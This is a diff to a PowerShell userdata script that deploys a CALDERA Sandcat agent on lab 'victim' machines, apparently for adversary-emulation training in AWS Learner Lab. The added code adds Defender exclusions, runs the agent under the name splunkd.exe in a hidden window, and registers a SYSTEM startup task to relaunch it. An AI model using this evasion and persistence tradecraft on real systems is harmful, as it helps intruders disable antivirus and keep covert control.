@@ -105,5 +105,29 @@ for ($i = 1; $i -le 120; $i++) {   # up to 120 * 30s = 60 min
     }
 }
 if (-not $deployed) { Write-Output "sandcat deploy gave up after 60 min" }
+
+# --- 3. Persist the agent across reboots / Learner Lab stop-start -------
+# This userdata runs ONCE (persist=false). When a stopped lab is resumed the
+# victim boots WITHOUT re-running it, so the agent process stays down and shows
+# "dead" in CALDERA. Register a SYSTEM AtStartup task that re-asserts the Defender
+# exclusion (in case a signature update reset it) and relaunches the agent if it
+# isn't already running. The server's PRIVATE IP is stable across stop/start, so
+# the $server URL baked into the boot script stays valid; it only changes if the
+# server is recreated, in which case victims are rebuilt and this is regenerated.
+$bootScript = "$pub\start-sandcat.ps1"
+@"
+Add-MpPreference -ExclusionPath '$pub' -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath '$agentPath' -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionProcess 'splunkd.exe' -ErrorAction SilentlyContinue
+if ((Test-Path '$agentPath') -and -not (Get-Process splunkd -ErrorAction SilentlyContinue)) {
+    Start-Process -FilePath '$agentPath' -ArgumentList '-server $server -group $group' -WindowStyle hidden
+}
+"@ | Set-Content -Path $bootScript -Encoding ASCII
+
+$act  = New-ScheduledTaskAction  -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$bootScript`""
+$trg  = New-ScheduledTaskTrigger -AtStartup
+$prin = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+Register-ScheduledTask -TaskName "sandcat" -Action $act -Trigger $trg -Principal $prin -Force -ErrorAction SilentlyContinue
+Write-Output "registered AtStartup task 'sandcat' for resume-after-stop"
 </powershell>
 <persist>false</persist>
